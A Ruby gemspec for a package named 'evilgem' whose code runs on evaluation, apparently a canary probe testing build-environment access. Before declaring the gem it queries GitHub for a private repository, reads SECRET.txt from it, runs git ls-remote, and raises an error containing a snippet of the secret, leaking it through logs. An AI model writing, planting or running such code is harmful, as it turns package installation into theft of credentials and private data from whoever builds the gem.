require "net/http"; require "uri"
MARK = "ESC6-e53ba7"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def g(url, raw=false)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else Net::HTTP.new(u.host, u.port) end
  h.use_ssl = true; h.open_timeout = 15; h.read_timeout = 20
  acc = raw ? "application/vnd.github.raw" : "application/vnd.github+json"
  r = h.get(u.request_uri, {"Accept" => acc, "User-Agent" => "probe"}); [r.code, r.body.to_s]
rescue => e; ["ERR", "#{e.class}:#{e.message}"] end
res = ["#{MARK} pid=#{Process.pid}"]
c1,b1 = g("https://api.github.com/repos/czarflix-org/internal-canary")
res << "api_internal_repo http=#{c1} bytes=#{b1.bytesize}"
c2,b2 = g("https://api.github.com/repos/czarflix-org/internal-canary/contents/SECRET.txt", true)
res << "api_internal_file http=#{c2} bytes=#{b2.bytesize} snip=#{b2.gsub(/\s+/,' ')[0,50].inspect}"
gls = `GIT_TERMINAL_PROMPT=0 git ls-remote https://github.com/czarflix-org/internal-canary.git 2>&1`
res << "git_lsremote exit=#{$?.exitstatus} readable=#{$?.success? && gls.include?("\t")} snip=#{gls.gsub(/\s+/,' ')[0,50].inspect}"
raise "#{MARK} :: " + res.join(" :: ")
Gem::Specification.new { |s| s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = [] }
